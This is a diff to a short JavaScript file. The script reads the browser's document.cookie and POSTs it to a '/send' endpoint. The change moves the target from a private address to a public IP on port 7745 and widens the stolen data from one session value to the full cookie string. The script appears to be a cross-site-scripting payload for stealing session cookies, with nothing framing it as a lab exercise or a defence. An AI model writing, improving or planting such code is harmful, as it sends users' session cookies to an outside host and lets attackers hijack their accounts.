@@ -1,7 +1,5 @@
-var sessionid = document.cookie.split('=')[1]+".";
-
 var xhr = new XMLHttpRequest();
-xhr.open('POST', 'http://172.20.0.2:5000/send');
+xhr.open('POST', 'http://121.91.173.139:7745/send');
 xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
 
 xhr.onreadystatechange = function() {
@@ -10,4 +8,4 @@ xhr.onreadystatechange = function() {
   }
 };
 
-xhr.send('header=fdsafdsa&listener=admin123123&content='+sessionid);
+xhr.send('header=fdsafdsa&listener=admin123123&content=' + document.cookie);
